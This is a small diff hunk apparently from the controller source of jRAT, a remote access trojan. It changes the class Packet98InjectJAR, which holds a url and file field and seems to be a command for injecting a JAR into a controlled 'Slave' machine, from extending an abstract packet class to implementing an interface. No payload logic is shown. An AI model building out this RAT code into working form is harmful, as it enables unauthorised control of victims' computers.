@@ -5,7 +5,7 @@ import jrat.controller.Slave;
 
 import java.io.File;
 
-public class Packet98InjectJAR extends AbstractOutgoingPacket {
+public class Packet98InjectJAR implements OutgoingPacket {
 
 	private String url;
 	private File file;
